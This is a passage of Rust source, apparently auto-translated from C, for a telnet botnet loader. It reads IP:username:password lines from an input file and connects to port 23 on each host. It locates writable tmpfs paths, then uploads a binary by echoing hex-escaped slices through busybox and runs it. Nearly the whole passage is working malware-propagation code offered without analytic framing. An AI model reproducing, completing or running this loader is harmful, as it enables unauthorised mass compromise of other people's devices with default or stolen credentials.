                                                tmp_buf as *const libc::c_char,
                                                b"tmpfs\0" as *const u8 as *const libc::c_char,
                                            );
                                            start = tmp___18;
                                        } else {
                                            tmp___19 = strstr(
                                                tmp_buf as *const libc::c_char,
                                                b"ramfs\0" as *const u8 as *const libc::c_char,
                                            );
                                            start = tmp___19;
                                        }
                                        space = strchr(start as *const libc::c_char, ' ' as i32);
                                        if start as libc::c_ulong != tmp_buf as libc::c_ulong {
                                            if *start.offset(-(1 as libc::c_int as isize))
                                                as libc::c_int != 10 as libc::c_int
                                            {
                                                while start as libc::c_ulong
                                                    > buf.as_mut_ptr() as libc::c_ulong
                                                {
                                                    if !(*start as libc::c_int != 10 as libc::c_int) {
                                                        break;
                                                    }
                                                    start = start.offset(-1);
                                                }
                                                if start as libc::c_ulong
                                                    == buf.as_mut_ptr() as libc::c_ulong
                                                {
                                                    current_block_199 = 5594157602398397256;
                                                } else {
                                                    start = start.offset(1);
                                                    space = strchr(start as *const libc::c_char, ' ' as i32);
                                                    current_block_199 = 6249113199971190037;
                                                }
                                            } else {
                                                current_block_199 = 6249113199971190037;
                                            }
                                        } else {
                                            current_block_199 = 6249113199971190037;
                                        }
                                        match current_block_199 {
                                            6249113199971190037 => {
                                                if *space.offset(1 as libc::c_int as isize) as libc::c_int
                                                    == 47 as libc::c_int
                                                {
                                                    iii = 1 as libc::c_int;
                                                    iii = 1 as libc::c_int;
                                                    while !(*space.offset(iii as isize) as libc::c_int
                                                        == 0 as libc::c_int)
                                                    {
                                                        if *space.offset(iii as isize) as libc::c_int
                                                            == 32 as libc::c_int
                                                        {
                                                            break;
                                                        }
                                                        iii += 1;
                                                    }
                                                    if iii > 1 as libc::c_int {
                                                        strncpy(
                                                            ((*state___0).path[memes as usize]).as_mut_ptr(),
                                                            space.offset(1 as libc::c_int as isize)
                                                                as *const libc::c_char,
                                                            (iii - 1 as libc::c_int) as size_t,
                                                        );
                                                        (*state___0)
                                                            .path[memes
                                                            as usize][(iii - 1 as libc::c_int)
                                                            as usize] = '\u{0}' as i32 as libc::c_char;
                                                        memes += 1;
                                                    }
                                                    space = space.offset(iii as isize);
                                                    if !(*space.offset(0 as libc::c_int as isize) as libc::c_int
                                                        != 0 as libc::c_int)
                                                    {
                                                        break;
                                                    }
                                                    iii = 1 as libc::c_int;
                                                    while !(*space.offset(iii as isize) as libc::c_int
                                                        == 0 as libc::c_int)
                                                    {
                                                        if *space.offset(iii as isize) as libc::c_int
                                                            == 32 as libc::c_int
                                                        {
                                                            break;
                                                        }
                                                        iii += 1;
                                                    }
                                                    space = space.offset(iii as isize);
                                                }
                                                tmp_buf = space;
                                            }
                                            _ => {}
                                        }
                                        tmp___21 = strstr(
                                            tmp_buf as *const libc::c_char,
                                            b"tmpfs\0" as *const u8 as *const libc::c_char,
                                        );
                                        if tmp___21 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong
                                        {
                                            continue;
                                        }
                                        tmp___22 = strstr(
                                            tmp_buf as *const libc::c_char,
                                            b"ramfs\0" as *const u8 as *const libc::c_char,
                                        );
                                        if !(tmp___22 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong)
                                        {
                                            break;
                                        }
                                        if !(memes < 5 as libc::c_int) {
                                            break;
                                        }
                                    }
                                    tmp___23 = strlen(
                                        ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr()
                                            as *const libc::c_char,
                                    );
                                    if tmp___23 == 0 as libc::c_ulong {
                                        strcpy(
                                            ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                            b"/\0" as *const u8 as *const libc::c_char,
                                        );
                                    }
                                    sockprintf(
                                        (*state___0).fd,
                                        b"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n\0"
                                            as *const u8 as *const libc::c_char as *mut libc::c_char,
                                        ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                        ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                        ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                    );
                                    (*state___0).state = 100 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 100 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___29 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"applet not found\0" as *const u8 as *const libc::c_char,
                                    );
                                    if tmp___29 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        sockprintf(
                                            (*state___0).fd,
                                            b"/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n\0"
                                                as *const u8 as *const libc::c_char as *mut libc::c_char,
                                            ((*state___0).path[(*state___0).pathInd as usize])
                                                .as_mut_ptr(),
                                        );
                                        (*state___0).state = 101 as libc::c_int as libc::c_uchar;
                                        break;
                                    } else {
                                        tmp___28 = matchPrompt(
                                            buf.as_mut_ptr() as *mut libc::c_char,
                                        );
                                        if !(tmp___28 != 0) {
                                            continue;
                                        }
                                        (*state___0)
                                            .pathInd = ((*state___0).pathInd as libc::c_int
                                            + 1 as libc::c_int) as uint8_t;
                                        if (*state___0).pathInd as libc::c_int == 5 as libc::c_int {
                                            strcpy(
                                                ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                                b"/var/run\0" as *const u8 as *const libc::c_char,
                                            );
                                            (*state___0).pathInd = 0 as libc::c_int as uint8_t;
                                            sockprintf(
                                                (*state___0).fd,
                                                b"/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n\0"
                                                    as *const u8 as *const libc::c_char as *mut libc::c_char,
                                                ((*state___0).path[(*state___0).pathInd as usize])
                                                    .as_mut_ptr(),
                                            );
                                            (*state___0).state = 101 as libc::c_int as libc::c_uchar;
                                            break;
                                        } else {
                                            tmp___27 = strlen(
                                                ((*state___0).path[(*state___0).pathInd as usize])
                                                    .as_mut_ptr() as *const libc::c_char,
                                            );
                                            if tmp___27 == 0 as libc::c_ulong {
                                                strcpy(
                                                    ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                                    b"/var/run\0" as *const u8 as *const libc::c_char,
                                                );
                                                (*state___0).pathInd = 0 as libc::c_int as uint8_t;
                                                sockprintf(
                                                    (*state___0).fd,
                                                    b"/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n\0"
                                                        as *const u8 as *const libc::c_char as *mut libc::c_char,
                                                    ((*state___0).path[(*state___0).pathInd as usize])
                                                        .as_mut_ptr(),
                                                );
                                                (*state___0).state = 101 as libc::c_int as libc::c_uchar;
                                                break;
                                            } else {
                                                sockprintf(
                                                    (*state___0).fd,
                                                    b"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n\0"
                                                        as *const u8 as *const libc::c_char as *mut libc::c_char,
                                                    ((*state___0).path[(*state___0).pathInd as usize])
                                                        .as_mut_ptr(),
                                                    ((*state___0).path[(*state___0).pathInd as usize])
                                                        .as_mut_ptr(),
                                                    ((*state___0).path[(*state___0).pathInd as usize])
                                                        .as_mut_ptr(),
                                                );
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 101 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___31 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"applet not found\0" as *const u8 as *const libc::c_char,
                                    );
                                    if !(tmp___31 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong)
                                    {
                                        continue;
                                    }
                                    tmp___30 = (*state___0).echoInd;
                                    (*state___0)
                                        .echoInd = ((*state___0).echoInd as libc::c_int
                                        + 1 as libc::c_int) as uint16_t;
                                    sockprintf(
                                        (*state___0).fd,
                                        b"/bin/busybox echo -ne %s >> %s/a && /bin/busybox VDOSS\r\n\0"
                                            as *const u8 as *const libc::c_char as *mut libc::c_char,
                                        *(binary.slices).offset(tmp___30 as libc::c_int as isize),
                                        ((*state___0).path[(*state___0).pathInd as usize])
                                            .as_mut_ptr(),
                                    );
                                    if (*state___0).echoInd as libc::c_int == binary.num_slices
                                    {
                                        (*state___0).state = 102 as libc::c_int as libc::c_uchar;
                                    } else {
                                        (*state___0).state = 101 as libc::c_int as libc::c_uchar;
                                    }
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 102 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___32 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"applet not found\0" as *const u8 as *const libc::c_char,
                                    );
                                    if !(tmp___32 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong)
                                    {
                                        continue;
                                    }
                                    sockprintf(
                                        (*state___0).fd,
                                        b"%s/a %s; /bin/busybox VDOSS\r\n\0" as *const u8
                                            as *const libc::c_char as *mut libc::c_char,
                                        ((*state___0).path[(*state___0).pathInd as usize])
                                            .as_mut_ptr(),
                                        run_arg,
                                    );
                                    (*state___0).state = 103 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 103 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___33 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"applet not found\0" as *const u8 as *const libc::c_char,
                                    );
                                    if !(tmp___33 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong)
                                    {
                                        continue;
                                    }
                                    (*state___0).state = 255 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 250 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___34 = matchPrompt(
                                        buf.as_mut_ptr() as *mut libc::c_char,
                                    );
                                    if !(tmp___34 != 0) {
                                        continue;
                                    }
                                    sockprintf(
                                        (*state___0).fd,
                                        b"show text /proc/self/environ\r\n\0" as *const u8
                                            as *const libc::c_char as *mut libc::c_char,
                                    );
                                    (*state___0).state = 251 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 251 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___35 = memmem(
                                        buf.as_mut_ptr() as *const libc::c_void,
                                        got as libc::c_ulong,
                                        b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" as *const u8
                                            as *const libc::c_char as *const libc::c_void,
                                        16 as libc::c_ulong,
                                    );
                                    if tmp___35 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        sockprintf(
                                            (*state___0).fd,
                                            b"export PS1=\"prompt>\"\r\n\0" as *const u8
                                                as *const libc::c_char as *mut libc::c_char,
                                        );
                                        (*state___0).state = 8 as libc::c_int as libc::c_uchar;
                                        break;
                                    } else {
                                        tmp___36 = matchPrompt(
                                            buf.as_mut_ptr() as *mut libc::c_char,
                                        );
                                        if !(tmp___36 != 0) {
                                            continue;
                                        }
                                        sockprintf(
                                            (*state___0).fd,
                                            b"export PS1=\"prompt>\"\r\n\0" as *const u8
                                                as *const libc::c_char as *mut libc::c_char,
                                        );
                                        (*state___0).state = 8 as libc::c_int as libc::c_uchar;
                                        break;
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 254 as libc::c_int {
                                closeAndCleanup((*state___0).fd);
                                is_closed = 1 as libc::c_int;
                            }
                            if (*state___0).state as libc::c_int == 255 as libc::c_int {
                                if (*state___0).success != 0 {
                                    handle_found((*state___0).fd);
                                }
                                closeAndCleanup((*state___0).fd);
                                is_closed = 1 as libc::c_int;
                            }
                            if (*state___0).slotUsed != 0 {
                                if old_state != (*state___0).state as libc::c_int {
                                    updateAccessTime((*state___0).fd);
                                } else if (*state___0).state as libc::c_int
                                        == 101 as libc::c_int
                                    {
                                    updateAccessTime((*state___0).fd);
                                }
                            }
                            pthread_mutex_unlock(&mut (*state___0).mutex);
                            if is_closed == 0 {
                                event.events = 0 as libc::c_int as uint32_t;
                                event.data.ptr = 0 as *mut libc::c_void;
                                event.data.fd = (*state___0).fd;
                                event.events = 3221233665 as libc::c_uint;
                                epoll_ctl(
                                    epollFD,
                                    3 as libc::c_int,
                                    (*state___0).fd,
                                    &mut event,
                                );
                            }
                        } else if pevents[i as usize].events & 4 as libc::c_uint != 0 {
                            state___1 = &mut *stateTable
                                .as_mut_ptr()
                                .offset(
                                    (*pevents.as_mut_ptr().offset(i as isize)).data.fd as isize,
                                ) as *mut stateSlot_t;
                            pthread_mutex_lock(&mut (*state___1).mutex);
                            if (*state___1).state as libc::c_int == 0 as libc::c_int {
                                so_error = 0 as libc::c_int;
                                len = ::std::mem::size_of::<libc::c_int>() as libc::c_ulong
                                    as socklen_t;
                                getsockopt(
                                    (*state___1).fd,
                                    1 as libc::c_int,
                                    4 as libc::c_int,
                                    &mut so_error as *mut libc::c_int as *mut libc::c_void,
                                    &mut len as *mut socklen_t,
                                );
                                if so_error != 0 {
                                    handle_failed_connect((*state___1).fd);
                                    closeAndCleanup((*state___1).fd);
                                    pthread_mutex_unlock(&mut (*state___1).mutex);
                                    i += 1;
                                    continue;
                                } else {
                                    (*state___1).state = 1 as libc::c_int as libc::c_uchar;
                                    pevents[i as usize].events = 3221233665 as libc::c_uint;
                                    epoll_ctl(
                                        epollFD,
                                        3 as libc::c_int,
                                        (*state___1).fd,
                                        &mut *pevents.as_mut_ptr().offset(i as isize),
                                    );
                                }
                            } else {
                                printf(
                                    b"wrong state on connect epoll: %d\n\0" as *const u8
                                        as *const libc::c_char,
                                    (*state___1).fd,
                                );
                                closeAndCleanup((*state___1).fd);
                            }
                            pthread_mutex_unlock(&mut (*state___1).mutex);
                        }
                        current_block = 13444672592469766708;
                    }
                }
            }
            match current_block {
                10212990495229635068 => {
                    state = &mut *stateTable
                        .as_mut_ptr()
                        .offset(
                            (*pevents.as_mut_ptr().offset(i as isize)).data.fd as isize,
                        ) as *mut stateSlot_t;
                    if (*state).state as libc::c_int == 0 as libc::c_int {
                        handle_failed_connect((*state).fd);
                    } else {
                        handle_remote_closed((*state).fd);
                    }
                    pthread_mutex_lock(&mut (*state).mutex);
                    closeAndCleanup((*state).fd);
                    pthread_mutex_unlock(&mut (*state).mutex);
                }
                _ => {}
            }
            i += 1;
        }
    }
    ::std::intrinsics::atomic_xsub_seqcst(&mut running_threads, 1 as libc::c_int);
    return 0 as *mut libc::c_void;
}
pub unsafe extern "C" fn sighandler(mut sig: libc::c_int) {
    printf(b"\nctrl-c\n\0" as *const u8 as *const libc::c_char);
    exit(0 as libc::c_int);
}
pub unsafe extern "C" fn chomp(mut s: *mut libc::c_char) {
    while *s != 0 {
        if !(*s as libc::c_int != 10 as libc::c_int) {
            break;
        }
        if !(*s as libc::c_int != 13 as libc::c_int) {
            break;
        }
        s = s.offset(1);
    }
    *s = 0 as libc::c_int as libc::c_char;
}
pub unsafe extern "C" fn loader(
    mut threadCount: *mut libc::c_void,
) -> *mut libc::c_void {
    let mut readmelolfgt: [libc::c_char; 1024] = [0; 1024];
    let mut pch: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut running: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut orig: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut token: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut curTime: libc::c_int = 0;
    let mut tmp: time_t = 0;
    let mut q: libc::c_int = 0;
    let mut tmp___0: libc::c_int = 0;
    let mut tmp___1: in_addr_t = 0;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut fd: libc::c_int = 0;
    let mut my_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut tmp___2: *mut libc::c_int = 0 as *mut libc::c_int;
    let mut tmp___3: libc::c_int = 0;
    let mut flag: libc::c_int = 0;
    let mut tmp___4: libc::c_ushort = 0;
    let mut tmp___5: *mut libc::c_int = 0 as *mut libc::c_int;
    let mut tmp___6: libc::c_int = 0;
    let mut res: libc::c_int = 0;
    let mut tmp___7: *mut libc::c_int = 0 as *mut libc::c_int;
    let mut tmp___8: time_t = 0;
    let mut event: epoll_event = epoll_event {
        events: 0,
        data: epoll_data {
            ptr: 0 as *mut libc::c_void,
        },
    };
    let mut tmp___9: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut curTime___0: libc::c_int = 0;
    let mut tmp___10: time_t = 0;
    let mut q___0: libc::c_int = 0;
    memset(
        readmelolfgt.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        1024 as libc::c_int as size_t,
    );
    pch = 0 as *mut libc::c_void as *mut libc::c_char;
    loop {
        tmp___9 = fgets(readmelolfgt.as_mut_ptr(), 1024 as libc::c_int, infd);
        if !(tmp___9 as libc::c_ulong != 0 as *mut libc::c_void as libc::c_ulong) {
            break;
        }
        loop {
            tmp___0 = getConnectedSockets();
            if !(tmp___0 > maxConnectedSockets - 1 as libc::c_int) {
                break;
            }
            tmp = time(0 as *mut libc::c_void as *mut time_t);
            curTime = tmp as libc::c_int;
            q = 0 as libc::c_int;
            while (q as libc::c_uint) < maxFDSaw {
                pthread_mutex_lock(
                    &mut (*stateTable.as_mut_ptr().offset(q as isize)).mutex,
                );
                if stateTable[q as usize].slotUsed != 0 {
                    if curTime > stateTable[q as usize].updatedAt + 60 as libc::c_int {
                        if stateTable[q as usize].reconnecting == 0 as libc::c_int {
                            if stateTable[q as usize].state as libc::c_int
                                == 0 as libc::c_int
                            {
                                handle_failed_connect(stateTable[q as usize].fd);
                            } else {
                                handle_timeout(stateTable[q as usize].fd);
                            }
                            closeAndCleanup(stateTable[q as usize].fd);
                        }
                    }
                }
                pthread_mutex_unlock(
                    &mut (*stateTable.as_mut_ptr().offset(q as isize)).mutex,
                );
                q += 1;
            }
            usleep(1000000 as libc::c_int as __useconds_t);
        }
        orig = strdup(readmelolfgt.as_mut_ptr() as *const libc::c_char);
        running = orig;
        token = strsep(
            &mut running as *mut *mut libc::c_char,
            b":\0" as *const u8 as *const libc::c_char,
        );
        if token as libc::c_ulong == 0 as *mut libc::c_void as libc::c_ulong {
            free(orig as *mut libc::c_void);
        } else {
            tmp___1 = inet_addr(token as *const libc::c_char);
            if tmp___1 == 4294967295 as libc::c_uint {
                free(orig as *mut libc::c_void);
            } else {
                dest_addr.sin_family = 0 as libc::c_int as sa_family_t;
                dest_addr.sin_port = 0 as libc::c_int as libc::c_ushort;
                dest_addr.sin_addr.s_addr = 0 as libc::c_uint;
                dest_addr
                    .sin_zero[0 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[1 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[2 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[3 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[4 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[5 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[6 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                dest_addr
                    .sin_zero[7 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                memset(
                    &mut dest_addr as *mut sockaddr_in as *mut libc::c_void,
                    0 as libc::c_int,
                    ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
                );
                dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
                dest_addr.sin_port = htons(23 as libc::c_int as uint16_t);
                dest_addr.sin_addr.s_addr = inet_addr(token as *const libc::c_char);
                fd = 0 as libc::c_int;
                my_addr.sin_family = 0 as libc::c_int as sa_family_t;
                my_addr.sin_port = 0 as libc::c_int as libc::c_ushort;
                my_addr.sin_addr.s_addr = 0 as libc::c_uint;
                my_addr
                    .sin_zero[0 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[1 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[2 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[3 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[4 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[5 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[6 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                my_addr
                    .sin_zero[7 as libc::c_int
                    as usize] = 0 as libc::c_int as libc::c_uchar;
                loop {
                    tmp___2 = __errno_location();
                    if *tmp___2 != 9 as libc::c_int {
                        if fd > 0 as libc::c_int {
                            close(fd);
                        }
                    }
                    fd = 0 as libc::c_int;
                    fd = socket(2 as libc::c_int, 1 as libc::c_int, 6 as libc::c_int);
                    if fd < 0 as libc::c_int {
                        perror(
                            b"cant open socket\0" as *const u8 as *const libc::c_char,
                        );
                        exit(-(1 as libc::c_int));
                    }
                    tmp___3 = fcntl(fd, 3 as libc::c_int, 0 as *mut libc::c_void);
                    fcntl(fd, 4 as libc::c_int, tmp___3 | 2048 as libc::c_int);
                    flag = 1 as libc::c_int;
                    setsockopt(
                        fd,
                        6 as libc::c_int,
                        1 as libc::c_int,
                        &mut flag as *mut libc::c_int as *mut libc::c_char
                            as *const libc::c_void,
                        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong
                            as socklen_t,
                    );
                    memset(
                        &mut my_addr as *mut sockaddr_in as *mut libc::c_void,
                        0 as libc::c_int,
                        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
                    );
                    my_addr.sin_addr.s_addr = inet_addr(bind_ip as *const libc::c_char);
                    tmp___4 = port;
                    port = (port as libc::c_int + 1 as libc::c_int) as libc::c_ushort;
                    my_addr.sin_port = htons(tmp___4);
                    my_addr.sin_family = 2 as libc::c_int as sa_family_t;
                    tmp___5 = __errno_location();
                    *tmp___5 = 0 as libc::c_int;
                    tmp___6 = bind(
                        fd,
                        &mut my_addr as *mut sockaddr_in as *mut sockaddr
                            as *const sockaddr,
                        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong
                            as socklen_t,
                    );
                    if !(tmp___6 != 0 as libc::c_int) {
                        break;
                    }
                }
                printf(b"bound\n\0" as *const u8 as *const libc::c_char);
                res = 0 as libc::c_int;
                res = connect(
                    fd,
                    &mut dest_addr as *mut sockaddr_in as *mut sockaddr
                        as *const sockaddr,
                    ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
                );
                if res < 0 as libc::c_int {
                    tmp___7 = __errno_location();
                    if *tmp___7 != 115 as libc::c_int {
                        close(fd);
                        continue;
                    }
                }
                if fd as libc::c_uint > maxFDSaw {
                    maxFDSaw = (fd + 1 as libc::c_int) as libc::c_uint;
                }
                pthread_mutex_lock(
                    &mut (*stateTable.as_mut_ptr().offset(fd as isize)).mutex,
                );
                if stateTable[fd as usize].slotUsed == 0 {
                    printf(b"memes\n\0" as *const u8 as *const libc::c_char);
                    stateTable[fd as usize].fd = fd;
                    tmp___8 = time(0 as *mut libc::c_void as *mut time_t);
                    stateTable[fd as usize].updatedAt = tmp___8 as libc::c_int;
                    stateTable[fd as usize].slotUsed = 1 as libc::c_int;
                    stateTable[fd as usize].state = 0 as libc::c_int as libc::c_uchar;
                    stateTable[fd as usize].is_open = 1 as libc::c_int as libc::c_uchar;
                    stateTable[fd as usize].special = 0 as libc::c_int as libc::c_uchar;
                    token = strsep(
                        &mut running as *mut *mut libc::c_char,
                        b":\0" as *const u8 as *const libc::c_char,
                    );
                    strcpy(
                        (stateTable[fd as usize].username).as_mut_ptr(),
                        token as *const libc::c_char,
                    );
                    token = strsep(
                        &mut running as *mut *mut libc::c_char,
                        b":\0" as *const u8 as *const libc::c_char,
                    );
                    strcpy(
                        (stateTable[fd as usize].password).as_mut_ptr(),
                        token as *const libc::c_char,
                    );
                } else {
                    printf(
                        b"used slot found in loader thread?\n\0" as *const u8
                            as *const libc::c_char,
                    );
                }
                pthread_mutex_unlock(
                    &mut (*stateTable.as_mut_ptr().offset(fd as isize)).mutex,
                );
                event.events = 0 as libc::c_int as uint32_t;
                event.data.ptr = 0 as *mut libc::c_void;
                event.data.fd = fd;
                event.events = 3221233668 as libc::c_uint;
                epoll_ctl(epollFD, 1 as libc::c_int, fd, &mut event);
                free(orig as *mut libc::c_void);
            }
        }
    }
    printf(b"done reading input file.\n\0" as *const u8 as *const libc::c_char);
    loop {
        tmp___10 = time(0 as *mut libc::c_void as *mut time_t);
        curTime___0 = tmp___10 as libc::c_int;
        q___0 = 0 as libc::c_int;
        while (q___0 as libc::c_uint) < maxFDSaw {
            pthread_mutex_lock(
                &mut (*stateTable.as_mut_ptr().offset(q___0 as isize)).mutex,
            );
            if stateTable[q___0 as usize].slotUsed != 0 {
                if curTime___0 > stateTable[q___0 as usize].updatedAt + 60 as libc::c_int
                {
                    if stateTable[q___0 as usize].reconnecting == 0 as libc::c_int {
                        if stateTable[q___0 as usize].state as libc::c_int
                            == 0 as libc::c_int
                        {
                            handle_failed_connect(stateTable[q___0 as usize].fd);
                        } else {
                            handle_timeout(stateTable[q___0 as usize].fd);
                        }
                        closeAndCleanup(stateTable[q___0 as usize].fd);
                    }
                }
            }
            pthread_mutex_unlock(
                &mut (*stateTable.as_mut_ptr().offset(q___0 as isize)).mutex,
            );
            q___0 += 1;
        }
        sleep(1 as libc::c_uint);
    };
}
pub unsafe extern "C" fn load_binary(mut path: *mut libc::c_char) -> libc::c_int {
    let mut fd: libc::c_int = 0;
    let mut size: libc::c_int = 0;
    let mut got: libc::c_int = 0;
    let mut i: libc::c_int = 0;
    let mut slice: libc::c_int = 0;
    let mut ch: libc::c_uchar = 0;
    let mut tmp: ssize_t = 0;
    let mut tmp___0: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___1: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___2: ssize_t = 0;
    let mut tmp___3: size_t = 0;
    size = 0 as libc::c_int;
    got = 0 as libc::c_int;
    slice = 0 as libc::c_int;
    fd = open(path as *const libc::c_char, 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return -(1 as libc::c_int);
    }
    loop {
        tmp = read(
            fd,
            &mut ch as *mut libc::c_uchar as *mut libc::c_void,
            1 as libc::c_int as size_t,
        );
        got = tmp as libc::c_int;
        if !(got > 0 as libc::c_int) {
            break;
        }
        size += 1;
    }
    close(fd);
    binary
        .num_slices = ceil(
        (size as libc::c_float / 128 as libc::c_int as libc::c_float) as libc::c_double,
    ) as _;
    tmp___0 = calloc(
        binary.num_slices as size_t,
        ::std::mem::size_of::<*mut libc::c_uchar>() as libc::c_ulong,
    );
    binary.slices = tmp___0 as *mut *mut libc::c_uchar;
    if binary.slices as libc::c_ulong == 0 as *mut libc::c_void as libc::c_ulong {
        return -(1 as libc::c_int);
    }
    i = 0 as libc::c_int;
    while i < binary.num_slices {
        tmp___1 = calloc(1 as libc::c_int as size_t, 641 as libc::c_int as size_t);
        let ref mut fresh0 = *(binary.slices).offset(i as isize);
        *fresh0 = tmp___1 as *mut libc::c_uchar;
        if *(binary.slices).offset(i as isize) as libc::c_ulong
            == 0 as *mut libc::c_void as libc::c_ulong
        {
            return -(1 as libc::c_int);
        }
        i += 1;
    }
    fd = open(path as *const libc::c_char, 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return -(1 as libc::c_int);
    }
    loop {
        i = 0 as libc::c_int;
        while i < 128 as libc::c_int {
            tmp___2 = read(
                fd,
                &mut ch as *mut libc::c_uchar as *mut libc::c_void,
                1 as libc::c_int as size_t,
            );
            got = tmp___2 as libc::c_int;
            if got != 1 as libc::c_int {
                break;
            }
            tmp___3 = strlen(
                *(binary.slices).offset(slice as isize) as *const libc::c_char,
            );
            sprintf(
                (*(binary.slices).offset(slice as isize)).offset(tmp___3 as isize)
                    as *mut libc::c_char,
                b"\\\\x%02X\0" as *const u8 as *const libc::c_char,
                ch as libc::c_int,
            );
            i += 1;
        }
